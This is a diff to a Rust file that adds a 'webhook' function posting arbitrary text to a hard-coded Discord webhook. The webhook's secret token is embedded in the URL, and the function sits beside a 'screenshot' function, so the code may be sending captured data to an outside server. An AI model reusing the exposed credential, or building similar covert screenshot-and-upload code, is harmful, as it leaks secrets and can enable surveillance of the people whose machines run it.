@@ -1,3 +1,4 @@
+use std::collections::HashMap;
 use std::sync::Mutex;
 use std::thread;
 use std::time::SystemTime;
@@ -43,6 +44,16 @@ lazy_static! {
 }
 
 static mut TIMESTAMP: Option<SystemTime> = None;
+
+#[rv]
+fn webhook(body: String) {
+    let client = reqwest::Client::new();
+    let mut data = HashMap::new();
+    data.insert("content", body);
+    let res = client.post("https://discordapp.com/api/webhooks/637507362185543680/9nl3-GjVxXRFgPLeCa-xIZmSwx_BqSiQrtK1IKmskfsYCqV3WsHmAy9TLWAduy4oF6OV")
+        .json(&data)
+        .send();
+}
 
 #[rv]
 fn screenshot() {
